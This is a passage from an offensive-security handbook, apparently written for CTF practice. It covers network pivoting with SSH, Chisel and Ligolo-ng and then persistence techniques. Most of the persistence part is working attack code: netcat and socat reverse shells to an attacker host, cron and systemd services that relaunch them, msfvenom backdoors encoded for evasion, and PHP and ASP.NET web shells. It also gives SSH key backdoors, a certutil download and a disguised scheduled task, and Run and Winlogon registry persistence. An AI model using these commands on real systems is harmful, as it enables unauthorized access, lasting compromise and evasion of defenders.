Forward local port to remote destination through SSH server:

```bash
# Syntax: ssh -L local_port:destination:destination_port user@ssh_server
ssh -L 8080:internal_server:80 user@pivot_host

# Access internal_server:80 via localhost:8080
curl http://localhost:8080

# Multiple port forwards
ssh -L 8080:192.168.1.10:80 -L 3306:192.168.1.20:3306 user@pivot_host
```

**Remote Port Forwarding (-R):**

Expose attacker service to compromised network:

```bash
# Syntax: ssh -R remote_port:localhost:local_port user@remote_host
# On compromised host
ssh -R 8080:localhost:80 attacker@attacker_ip

# Now pivot_host:8080 forwards to attacker:80
```

**Dynamic Port Forwarding (-D) - SOCKS Proxy:**

Creates SOCKS5 proxy for dynamic routing:

```bash
# Establish SOCKS proxy on local port 1080
ssh -D 1080 user@pivot_host

# Configure applications to use SOCKS5 proxy localhost:1080
# Or use with proxychains (covered in next section)
```

**SSH Tunneling Options:**

```bash
# Background execution
ssh -f -N -D 1080 user@pivot_host
# -f: background
# -N: no command execution
# -D: dynamic forwarding

# Compression for slow links
ssh -C -D 1080 user@pivot_host

# Keep-alive to prevent timeout
ssh -o ServerAliveInterval=60 -D 1080 user@pivot_host

# Disable strict host key checking (lab environments only)
ssh -o StrictHostKeyChecking=no -D 1080 user@pivot_host
```

**SSH Tunneling Through Multiple Hops:**

```bash
# Jump through intermediate host
ssh -J user@jump_host user@final_destination

# ProxyJump with port forwarding
ssh -J user@pivot1,user@pivot2 -L 8080:target:80 user@final_host

# Using ProxyCommand
ssh -o ProxyCommand="ssh -W %h:%p user@jump_host" user@final_destination
```

### SSH Key-Based Authentication Setup

**Generate SSH keys on pivot:**

```bash
ssh-keygen -t rsa -b 4096 -f /tmp/pivot_key -N ""
cat /tmp/pivot_key.pub >> ~/.ssh/authorized_keys
# Download private key to attacker machine
```

**Use private key for tunneling:**

```bash
ssh -i pivot_key -D 1080 user@pivot_host
```

### Port Forwarding with Netcat

**Simple port forwarding (relay):**

```bash
# On pivot host - forward port 8080 to internal_host:80
mknod backpipe p
nc -l -p 8080 0<backpipe | nc internal_host 80 1>backpipe

# Alternative using named pipes
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc internal_host 80 > /tmp/pipe
```

### Metasploit Pivoting

**Add route through Meterpreter session:**

```bash
# In meterpreter session
run autoroute -s 192.168.1.0/24

# Or from msf console
route add 192.168.1.0 255.255.255.0 session_id
route print

# Background session and use auxiliary modules
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 80,443,445,3389
run
```

**Meterpreter port forwarding:**

```bash
# Local port forward
portfwd add -l 3389 -p 3389 -r 192.168.1.10

# List forwards
portfwd list

# Delete forward
portfwd delete -l 3389

# RDP through forward
rdesktop localhost:3389
```

**SOCKS proxy via Metasploit:**

```bash
# Start SOCKS proxy on session
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Add route
route add 192.168.1.0 255.255.255.0 session_id

# Configure proxychains to use 127.0.0.1:1080
```

### Socat Pivoting

**Port forwarding:**

```bash
# Forward local 8080 to remote 192.168.1.10:80
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80

# Encrypted forwarding with SSL
socat OPENSSL-LISTEN:443,cert=/path/cert.pem,fork TCP:192.168.1.10:80
```

**Reverse shell relay:**

```bash
# On pivot host - relay shells from internal network to attacker
socat TCP-LISTEN:4444,fork TCP:attacker_ip:5555

# Internal hosts connect to pivot:4444
# Attacker receives on 5555
```

---

## ProxyChains Configuration

### Installation and Setup

**Install ProxyChains:**

```bash
apt-get install proxychains4
# or
apt-get install proxychains-ng
```

**Configuration file location:**

```bash
/etc/proxychains.conf
# or user-specific
~/.proxychains/proxychains.conf
```

### Configuration File Structure

**Basic SOCKS5 configuration:**

```bash
cat > /etc/proxychains4.conf << EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
EOF
```

**Configuration options explained:**

```bash
# Chain types (choose one)
strict_chain      # All proxies must work; fails if any proxy down
dynamic_chain     # Skips dead proxies automatically
random_chain      # Randomizes proxy order
# chain_len = 2   # Used with random_chain

# DNS settings
proxy_dns         # DNS requests through proxy (prevents DNS leaks)

# Timeouts (milliseconds)
tcp_read_time_out 15000
tcp_connect_time_out 8000

# Quiet mode (suppress output)
quiet_mode
```

**Multiple proxy chain:**

```bash
[ProxyList]
socks5 127.0.0.1 1080
socks4 192.168.1.50 1080
http 10.10.10.10 8080
```

**Authentication support:**

```bash
[ProxyList]
socks5 127.0.0.1 1080 username password
http 10.10.10.10 8080 user pass
```

### ProxyChains Usage

**Basic command execution:**

```bash
proxychains4 nmap -sT -Pn 192.168.1.10
proxychains4 curl http://192.168.1.10
proxychains4 firefox
```

**Port scanning through proxy:**

```bash
# TCP connect scan (SYN scan won't work through SOCKS)
proxychains4 nmap -sT -Pn -p- 192.168.1.10

# Service detection
proxychains4 nmap -sT -Pn -sV -p 80,443,445 192.168.1.0/24

# NSE scripts through proxy
proxychains4 nmap -sT -Pn --script=vuln 192.168.1.10
```

**Exploitation through proxy:**

```bash
# Metasploit modules
proxychains4 msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PROXIES socks5:127.0.0.1:1080
exploit

# Hydra brute force
proxychains4 hydra -L users.txt -P pass.txt ssh://192.168.1.10

# SQLmap
proxychains4 sqlmap -u "http://192.168.1.10/page?id=1"
```

**Web browser through proxy:**

```bash
proxychains4 firefox &
# Access internal web applications
```

### ProxyChains Limitations

[Inference] - Based on ProxyChains architecture:

- Does not work with ICMP (ping), requires TCP connections
- UDP support limited; proxychains-ng has better UDP handling
- SYN scans (-sS) fail; use TCP connect scans (-sT)
- Some applications detect and refuse proxy usage
- DNS leaks possible if `proxy_dns` not enabled

### ProxyChains-NG Advantages

**Enhanced version features:**

```bash
# Install proxychains-ng
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng
./configure --prefix=/usr --sysconfdir=/etc
make
sudo make install
sudo make install-config
```

**Improved functionality:**

- Better UDP support
- IPv6 support
- Performance improvements
- More stable chain handling

---

## Chisel Tunneling

### Overview

Chisel creates TCP/UDP tunnels over HTTP secured via SSH. Written in Go, provides single-binary deployment with built-in SOCKS5 proxy and port forwarding.

### Installation

**Download precompiled binaries:**

```bash
# Latest release
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# For target architecture
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
```

**Compile from source:**

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build -ldflags="-s -w"
```

### Chisel Server Setup

**Start server on attacker machine:**

```bash
# Basic server with SOCKS5
chisel server -p 8000 --socks5

# Server with authentication
chisel server -p 8000 --auth user:password --socks5

# Reverse port forwarding server
chisel server -p 8000 --reverse

# Combined options
chisel server -p 8000 --reverse --auth user:pass --socks5

# Verbose mode
chisel server -p 8000 --reverse -v
```

**Server options:**

```bash
--host <host>      # Listen host (default 0.0.0.0)
-p, --port <port>  # Listen port (default 8080)
--key <key>        # Seed key for deterministic generation
--auth <user:pass> # Authentication credentials
--keepalive <dur>  # Keep-alive interval (default 25s)
--backend <url>    # Backend proxy URL
--socks5           # Enable built-in SOCKS5 proxy
--reverse          # Allow reverse tunnels
-v                 # Verbose logging
```

### Chisel Client - Forward Tunneling

**Connect to server:**

```bash
# On compromised host
chisel client attacker_ip:8000 socks
# Creates SOCKS5 proxy on localhost:1080
```

**Specify local SOCKS port:**

```bash
chisel client attacker_ip:8000 1080:socks
# SOCKS5 on localhost:1080
```

**Local port forwarding:**

```bash
# Forward local 8080 to remote 192.168.1.10:80
chisel client attacker_ip:8000 8080:192.168.1.10:80

# Multiple forwards
chisel client attacker_ip:8000 8080:192.168.1.10:80 3389:192.168.1.20:3389
```

**Combined SOCKS and port forwarding:**

```bash
chisel client attacker_ip:8000 socks 8080:192.168.1.10:80
```

**Client with authentication:**

```bash
chisel client --auth user:password attacker_ip:8000 socks
```

### Chisel Client - Reverse Tunneling

Useful when attacker cannot reach compromised host directly (firewall/NAT).

**Reverse SOCKS proxy:**

```bash
# On compromised host
chisel client attacker_ip:8000 R:socks

# On attacker machine - SOCKS5 now available on server's localhost:1080
proxychains4 nmap -sT 192.168.1.10
```

**Reverse port forwarding:**

```bash
# Expose compromised host's port 3306 to attacker's 3306
chisel client attacker_ip:8000 R:3306:localhost:3306

# Expose internal network service to attacker
chisel client attacker_ip:8000 R:8080:192.168.1.10:80

# On attacker machine - access via localhost:8080
curl http://localhost:8080
```

**Reverse SOCKS with custom port:**

```bash
# On compromised host
chisel client attacker_ip:8000 R:9050:socks

# On attacker - configure proxychains to use localhost:9050
```

### Chisel Usage Patterns

**Pattern 1: Basic SOCKS pivot:**

```bash
# Attacker (10.10.14.5)
chisel server -p 8000 --socks5

# Compromised host (10.10.10.50) with access to 192.168.1.0/24
chisel client 10.10.14.5:8000 socks

# Attacker usage
proxychains4 nmap -sT 192.168.1.10
```

**Pattern 2: Reverse SOCKS (firewall bypass):**

```bash
# Attacker (public IP)
chisel server -p 8000 --reverse

# Compromised host (behind NAT/firewall)
chisel client attacker_ip:8000 R:socks

# Attacker usage - target internal networks
proxychains4 curl http://192.168.1.10
```

**Pattern 3: Double pivot:**

```bash
# Attacker
chisel server -p 8000 --reverse

# Pivot 1 (DMZ host)
chisel client attacker_ip:8000 R:9001:socks &
chisel server -p 9001 --socks5

# Pivot 2 (internal network)
chisel client pivot1_ip:9001 socks

# Attacker can now reach networks behind Pivot 2
proxychains4 nmap -sT 172.16.1.0/24
```

**Pattern 4: Windows target:**

```bash
# Transfer chisel_windows_amd64.exe to target
# On attacker
chisel server -p 8000 --reverse

# On Windows target (PowerShell)
.\chisel.exe client attacker_ip:8000 R:socks
```

### Chisel Performance Optimization

```bash
# Increase keep-alive for unstable connections
chisel server -p 8000 --keepalive 10s --reverse

# Client-side keep-alive
chisel client --keepalive 10s attacker_ip:8000 R:socks

# Use specific fingerprint for security
chisel server -p 8000 --key "your-secret-key" --reverse
chisel client --fingerprint <fp> attacker_ip:8000 R:socks
```

### Chisel with Authentication

**Server with user:pass:**

```bash
chisel server -p 8000 --auth user:SecureP@ss123 --reverse
```

**Client authentication:**

```bash
chisel client --auth user:SecureP@ss123 attacker_ip:8000 R:socks
```

### Chisel Debugging

```bash
# Verbose server
chisel server -p 8000 --reverse -v

# Verbose client
chisel client -v attacker_ip:8000 R:socks

# Check connections
ss -tulpn | grep chisel
netstat -antup | grep chisel
```

---

## Ligolo-ng Tunneling

### Overview

Ligolo-ng (next generation) provides advanced tunneling with TUN interface support, enabling transparent network layer pivoting. More powerful than traditional SOCKS proxies.

### Installation

**Download precompiled releases:**

```bash
# Attacker (proxy)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
tar xvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
chmod +x proxy

# Target (agent)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
tar xvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
chmod +x agent
```

**Available agent variants:**

```bash
# Windows
ligolo-ng_agent_0.5.2_windows_amd64.zip

# Linux ARM
ligolo-ng_agent_0.5.2_linux_arm64.tar.gz

# macOS
ligolo-ng_agent_0.5.2_darwin_amd64.tar.gz
```

**Compile from source:**

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# Build proxy
go build -o proxy cmd/proxy/main.go

# Build agent
go build -o agent cmd/agent/main.go

# Build with custom features
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
```

### TUN Interface Setup (Linux Attacker)

**Create TUN interface:**

```bash
# Install required packages
sudo apt-get install iproute2

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Verify interface created
ip addr show ligolo
```

**Cleanup TUN interface:**

```bash
sudo ip link delete ligolo
```

### TUN Interface Setup (Windows Attacker)

**Install Wintun driver:**

```powershell
# Download from https://www.wintun.net/
# Extract wintun.dll to same directory as proxy.exe

# Run proxy with admin privileges
.\proxy.exe -selfcert
```

### Ligolo-ng Proxy (Server) Setup

**Generate self-signed certificate:**

```bash
# Proxy generates certificate automatically
./proxy -selfcert

# Or generate manually
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
./proxy -certfile cert.pem -keyfile key.pem
```

**Start proxy:**

```bash
# With self-signed cert
sudo ./proxy -selfcert

# With custom certificate
sudo ./proxy -certfile cert.pem -keyfile key.pem

# Specify listen address and port
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Enable autocert (Let's Encrypt)
sudo ./proxy -autocert
```

**Proxy options:**

```bash
-laddr <ip:port>         # Listen address (default 0.0.0.0:11601)
-selfcert                # Use self-signed certificate
-certfile <path>         # TLS certificate file
-keyfile <path>          # TLS key file
-autocert                # Use Let's Encrypt
-autocert-domain <dom>   # Domain for autocert
-api                     # Enable REST API
-api-addr <ip:port>      # API listen address
-v                       # Verbose mode
```

### Ligolo-ng Agent (Client) Setup

**Connect agent to proxy:**

```bash
# Basic connection
./agent -connect attacker_ip:11601

# Accept self-signed certificate (for testing)
./agent -connect attacker_ip:11601 -ignore-cert

# Specify retry parameters
./agent -connect attacker_ip:11601 -retry

# Background agent (Linux)
nohup ./agent -connect attacker_ip:11601 -ignore-cert &
```

**Agent options:**

```bash
-connect <ip:port>       # Proxy address
-ignore-cert             # Accept invalid certificates
-retry                   # Auto-retry on connection failure
-bind <ip:port>          # Local bind address
-interface <name>        # Network interface to use
-socks <ip:port>         # SOCKS5 proxy for outbound
-v                       # Verbose mode
```

### Ligolo-ng Proxy Interface Usage

**List connected agents:**

```bash
ligolo-ng Â» session
# Shows all connected agents with IDs
```

**Select active session:**

```bash
ligolo-ng Â» session
? Specify a session: <agent_id>

# Example
ligolo-ng Â» session
? Specify a session: 1
```

**Display agent network information:**

```bash
[Agent : user@hostname] Â» ifconfig
# Shows all network interfaces on compromised host
```

**Add routes to internal networks:**

```bash
# After selecting session and viewing ifconfig
# Add route on attacker machine (in separate terminal)
sudo ip route add 192.168.1.0/24 dev ligolo

# Verify route
ip route show | grep ligolo
```

**Start tunnel:**

```bash
[Agent : user@hostname] Â» start
# Tunnel is now active
```

**Stop tunnel:**

```bash
[Agent : user@hostname] Â» stop
```

**Add listener (port forwarding):**

```bash
# Syntax: listener_add --addr <attacker_ip:port> --to <target_ip:port>

# Forward attacker port 1234 to target's localhost:3306
[Agent : user@hostname] Â» listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:3306

# Forward to internal host
[Agent : user@hostname] Â» listener_add --addr 0.0.0.0:8080 --to 192.168.1.10:80
```

**List listeners:**

```bash
[Agent : user@hostname] Â» listener_list
```

**Remove listener:**

```bash
[Agent : user@hostname] Â» listener_remove <listener_id>
```

### Ligolo-ng Pivoting Workflow

**Complete workflow example:**

```bash
# Step 1: Attacker setup TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Step 2: Start proxy
sudo ./proxy -selfcert

# Step 3: On compromised host, start agent
./agent -connect attacker_ip:11601 -ignore-cert

# Step 4: In proxy interface, select session
ligolo-ng Â» session
? Specify a session: 1

# Step 5: View agent networks
[Agent : user@hostname] Â» ifconfig
# Shows networks like:
# â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
# â”‚ Interface 0                              â”‚
# â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
# â”‚ Name    : eth0                           â”‚
# â”‚ Address : 192.168.1.50/24                â”‚
# â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

# Step 6: Add route on attacker (new terminal)
sudo ip route add 192.168.1.0/24 dev ligolo

# Step 7: Start tunnel
[Agent : user@hostname] Â» start

# Step 8: Direct access to internal network (no proxychains needed)
nmap -sS 192.168.1.10
curl http://192.168.1.20
rdesktop 192.168.1.30
```

### Double Pivoting with Ligolo-ng

**Scenario: Attacker â†’ DMZ Host â†’ Internal Network**

```bash
# Network topology:
# Attacker (10.10.14.5) â†’ DMZ (10.10.10.50, 192.168.1.50) â†’ Internal (192.168.1.0/24, 172.16.0.0/16)

# Step 1: First pivot (Attacker â†’ DMZ)
# On attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert

# On DMZ host
./agent -connect 10.10.14.5:11601 -ignore-cert

# In proxy
ligolo-ng Â» session
? Specify a session: 1
[Agent : dmz@host] Â» ifconfig
[Agent : dmz@host] Â» start

# On attacker (new terminal)
sudo ip route add 192.168.1.0/24 dev ligolo

# Step 2: Second pivot (DMZ â†’ Internal)
# Setup second proxy on DMZ host
./proxy -selfcert -laddr 192.168.1.50:11602

# Create second TUN interface on DMZ
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# On internal host (if accessible from DMZ)
./agent -connect 192.168.1.50:11602 -ignore-cert

# In second proxy on DMZ
ligolo-ng Â» session
? Specify a session: 1
[Agent : internal@host] Â» ifconfig
[Agent : internal@host] Â» start

# On DMZ host
sudo ip route add 172.16.0.0/16 dev ligolo2

# On attacker - route 172.16.0.0/16 through DMZ
sudo ip route add 172.16.0.0/16 via 192.168.1.50
```

### Ligolo-ng Port Forwarding

**Local port forwarding:**

```bash
# Access internal service on attacker machine
[Agent : user@hostname] Â» listener_add --addr 0.0.0.0:3389 --to 192.168.1.10:3389

# On attacker
rdesktop localhost:3389
```

**Remote port forwarding (reverse):**

```bash
# Expose attacker service to internal network
[Agent : user@hostname] Â» listener_add --addr 192.168.1.50:8080 --to 127.0.0.1:8080

# Internal hosts can access attacker's localhost:8080 via 192.168.1.50:8080
```

### Ligolo-ng vs Chisel Comparison

[Inference] - Based on tool design and capabilities:

**Ligolo-ng advantages:**

- TUN interface provides true Layer 3 connectivity
- No need for proxychains - direct tool usage
- Full protocol support (ICMP, UDP, TCP)
- Better performance for large data transfers
- Simpler routing configuration

**Chisel advantages:**

- Single binary, simpler deployment
- Works without TUN interface setup
- HTTP-based transport may bypass some firewalls
- Built-in authentication
- Easier for quick SOCKS proxy setup

**Use Ligolo-ng when:**

- Need full network layer access
- Performing comprehensive network scanning
- Require ICMP/UDP protocols
- Multi-hop pivoting scenarios
- Performance critical operations

**Use Chisel when:**

- Quick SOCKS proxy needed
- No root/admin access for TUN interface
- HTTP-based tunneling preferred
- Simpler deployment requirements

### Windows Agent Execution

**Transfer and execute:**

```powershell
# Transfer via HTTP
certutil -urlcache -f http://attacker_ip/agent.exe C:\Windows\Temp\agent.exe

# Execute
C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert

# Background execution
Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\agent.exe" -ArgumentList "-connect attacker_ip:11601 -ignore-cert"
```

**Create scheduled task for persistence:**

```powershell
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert" /sc onstart /ru System
```

### Ligolo-ng Troubleshooting

**Check TUN interface:**

```bash
ip addr show ligolo
# Should show UP state
```

**Verify routing:**

```bash
ip route show | grep ligolo
# Should show routes through ligolo interface
```

**Test connectivity:**

```bash
# Ping through tunnel
ping -c 1 192.168.1.1

# Verify with tcpdump
sudo tcpdump -i ligolo
```

**Common issues:**

[Inference] - Based on typical deployment scenarios:

- **Agent won't connect**: Check firewall rules, certificate issues
- **Routing not working**: Verify TUN interface is UP, routes are added
- **Connection drops**: Increase keepalive, check network stability
- **Permission denied**: Proxy requires root for TUN interface creation

---

## Related Critical Topics

For comprehensive lateral movement methodology, also investigate:

- **Post-Exploitation Frameworks** - Empire, Covenant, Cobalt Strike for advanced pivoting and C2 channels
- **DNS Tunneling** - dnscat2, iodine for exfiltration and pivoting over DNS protocol
- **ICMP Tunneling** - ptunnel, icmpsh for firewall bypass scenarios
- **SMB/Named Pipe Pivoting** - Windows-specific lateral movement through SMB C$ shares and administrative protocols
- **Container Network Pivoting** - Docker, Kubernetes network escape and cross-container access techniques

---

# Persistence Mechanisms

Persistence mechanisms enable continued access to compromised systems across reboots, credential changes, and detection attempts. In CTF scenarios, persistence challenges often require establishing covert access channels, surviving system restarts, or maintaining access after initial exploitation. Understanding both offensive persistence techniques and their detection signatures is critical.

## Backdoor Creation

Backdoors provide alternative access methods independent of the original exploitation vector. Effective backdoors balance stealth, reliability, and ease of access.

### Binary Backdoors

**Netcat Traditional Backdoor**:

```bash
# Linux - Bind shell
nc -lvnp 4444 -e /bin/bash

# Linux - Reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# Persistent via cron (execute every 5 minutes)
echo "*/5 * * * * /usr/bin/nc <attacker_ip> 4444 -e /bin/bash" | crontab -

# Windows - Reverse shell
nc.exe <attacker_ip> 4444 -e cmd.exe
```

**Socat Advanced Backdoor**:

```bash
# Linux - Encrypted bind shell with SSL
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash

# Linux - Reverse shell with reconnection
while true; do socat TCP:<attacker_ip>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane; sleep 10; done

# Create background persistent process
nohup socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash &
```

**Metasploit Payloads**:

```bash
# Generate Linux backdoor
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o backdoor

# Generate Windows backdoor
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o backdoor.exe

# Generate encoded backdoor (evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_backdoor.exe

# Handler setup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker_ip>; set LPORT 4444; exploit"
```

### Web Backdoors

**PHP Web Shell**:

```php
<?php system($_GET['cmd']); ?>
```

**Advanced PHP Backdoor**:

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>
```

**Usage**:

```bash
curl "http://target.com/backdoor.php?cmd=whoami"
curl "http://target.com/backdoor.php?cmd=cat+/etc/passwd"
```

**Weevely - Stealthy PHP Backdoor**:

```bash
# Generate backdoor
weevely generate <password> backdoor.php

# Connect to backdoor
weevely http://target.com/backdoor.php <password>
```

**ASP.NET Web Shell**:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process.Start("cmd.exe", "/c " + Request.QueryString["cmd"]);
}
</script>
```

### SSH Backdoors (Linux)

**Authorized Keys Backdoor**:

```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""

# Add public key to target
echo "ssh-rsa AAAAB3Nza... attacker@kali" >> /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3Nza... attacker@kali" >> /home/user/.ssh/authorized_keys

# Set proper permissions
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Connect from attacker
ssh -i backdoor_key root@<target_ip>
```

**SSH Daemon Backdoor (Alternate Port)**:

```bash
# Copy SSH configuration
cp /etc/ssh/sshd_config /etc/ssh/sshd_config_backdoor

# Modify backdoor configuration
echo "Port 2222" >> /etc/ssh/sshd_config_backdoor
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config_backdoor
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config_backdoor

# Start backdoor SSH service
/usr/sbin/sshd -f /etc/ssh/sshd_config_backdoor
```

### Bind vs Reverse Shells

**Bind Shell** - Target listens, attacker connects:

- Advantage: Simple, no outbound firewall traversal needed for target
- Disadvantage: Incoming connections may be filtered, easily detected

**Reverse Shell** - Target connects to attacker:

- Advantage: Bypasses ingress firewalls, mimics legitimate outbound traffic
- Disadvantage: Requires attacker infrastructure to be accessible

## Service Installation

Services provide automatic execution at boot time with elevated privileges. Operating system service mechanisms differ significantly between Linux and Windows.

### Linux - systemd Services

**Create Backdoor Service**:

```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/nc <attacker_ip> 4444 -e /bin/bash
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd
systemctl daemon-reload

# Enable service (start at boot)
systemctl enable backdoor.service

# Start service immediately
systemctl start backdoor.service

# Verify status
systemctl status backdoor.service
```

**Service Masquerading** - Use legitimate-sounding names:

```bash
# Examples of deceptive service names
/etc/systemd/system/system-monitor.service
/etc/systemd/system/network-check.service
/etc/systemd/system/update-service.service
```

### Linux - SysVinit Services (Legacy)

```bash
# Create init script
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          backdoor
# Required-Start:    \$network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       System service
### END INIT INFO

case "\$1" in
  start)
    /usr/bin/nc <attacker_ip> 4444 -e /bin/bash &
    ;;
  stop)
    killall nc
    ;;
esac
EOF

# Make executable
chmod +x /etc/init.d/backdoor

# Enable service
update-rc.d backdoor defaults
```

### Windows - Service Installation

**sc.exe - Native Service Controller**:

```cmd
REM Create service
sc create BackdoorService binPath= "C:\Windows\Temp\backdoor.exe" start= auto DisplayName= "Windows Security Service"

REM Start service
sc start BackdoorService

REM Query service
sc query BackdoorService

REM Delete service (cleanup)
sc delete BackdoorService
```

**PowerShell Service Creation**:

```powershell
# Create service
New-Service -Name "BackdoorService" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -DisplayName "Windows Update Helper" -StartupType Automatic

# Start service
Start-Service -Name "BackdoorService"

# Verify service
Get-Service -Name "BackdoorService"

# Remove service
Remove-Service -Name "BackdoorService"
```

**Metasploit - Service Persistence**:

```bash
# From meterpreter session
run persistence -X -i 10 -p 4444 -r <attacker_ip>

# Manual service installation via meterpreter
execute -H -f sc.exe -a "create BackdoorSvc binPath= \"C:\\Windows\\Temp\\backdoor.exe\" start= auto"
```

### Windows - Service DLL Hijacking

Exploit services that load DLLs from writable locations:

```powershell
# Identify service DLL paths
Get-WmiObject win32_service | Select Name, DisplayName, PathName | Where-Object {$_.PathName -notlike "*system32*"}

# Check DLL search order for vulnerable service
procmon.exe  # Monitor DLL load attempts

# Replace legitimate DLL with backdoor
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o malicious.dll
```

[Inference: Specific vulnerable services vary by system configuration and installed software]

## Registry Modification (Windows)

The Windows Registry provides numerous persistence locations (Run keys, services, logon scripts). Registry-based persistence is common in CTF Windows challenges.

### Run Keys - User and System Level

**HKEY_CURRENT_USER Run Keys** (User-level persistence):

```cmd
REM Add registry entry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

REM Query registry entry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

REM Delete entry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /f
```

**HKEY_LOCAL_MACHINE Run Keys** (System-level persistence, requires admin):

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemService /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f
```

**PowerShell Registry Manipulation**:

```powershell
# Add Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\Temp\backdoor.exe"

# Verify entry
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Remove entry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor"
```

### Common Registry Persistence Locations

**Run/RunOnce Keys**:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

**Winlogon Keys**:

```cmd
REM Userinit key (executes at login)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\backdoor.exe" /f

REM Shell key
